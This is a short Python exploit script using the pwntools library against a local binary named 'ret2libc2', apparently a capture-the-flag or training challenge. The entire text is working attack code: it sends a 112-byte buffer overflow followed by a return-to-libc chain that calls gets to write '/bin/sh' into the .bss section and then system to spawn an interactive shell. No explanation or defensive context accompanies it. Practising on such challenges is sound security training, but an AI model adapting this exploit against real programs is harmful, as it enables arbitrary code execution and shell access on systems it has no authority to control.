from pwn import *

gets_plt = 0x08048460
system_plt = 0x08048490
bss_addr = 0x0804a080

sh = process('./ret2libc2')
sh.recvuntil('What do you think ?')

payload = b'a'*112 + p32(gets_plt) + p32(system_plt) + p32(bss_addr) + p32(bss_addr)
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()

